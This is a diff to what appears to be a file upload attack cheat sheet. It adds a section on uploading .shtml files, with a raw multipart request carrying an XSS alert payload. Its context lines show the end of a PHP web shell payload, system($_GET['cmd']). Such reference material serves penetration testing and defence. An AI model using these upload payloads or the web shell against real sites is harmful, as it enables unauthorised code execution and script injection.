@@ -177,6 +177,22 @@ system($_GET['cmd']);
 ?>
 -----------------------------4829104394923874193918493216
 ```
+
+#### SHTML/SHTM Extension Allowed
+`.shtml` and `.shtm` files are related to a scripting language called Server Side Includes. They are meant to allow for pages to include other pages using some HTML-like syntax.
+```
+POST /upload HTTP/1.1
+Host: website.com
+Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216
+
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="file" filename="xss.shtml"
+Content-Type: text/html
+
+<script>alert(1)</script>
+-----------------------------4829104394923874193918493216
+```
+
 # Bypasses
 
 #### Keeping The Image Header 
